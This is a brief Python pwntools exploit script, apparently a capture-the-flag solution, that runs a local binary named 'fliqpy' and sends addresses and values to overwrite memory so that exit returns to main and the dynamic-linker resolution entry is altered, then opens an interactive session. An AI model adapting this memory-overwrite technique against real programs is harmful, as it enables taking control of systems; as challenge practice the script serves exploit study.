from pwn import *

def f(a, b):
    p.sendline(hex(a))
    p.sendline(str(b))

p = process('./fliqpy')

# make exit go to main
f(0x601031, 0)

# change dl_resolve
f(0x601010, 4)
f(0x601010, 5)
f(0x601010, 6)


#p.sendline('0x601030')
#p.sendline('2')

#p.sendline('0x601031')
#p.sendline('0')

p.interactive()
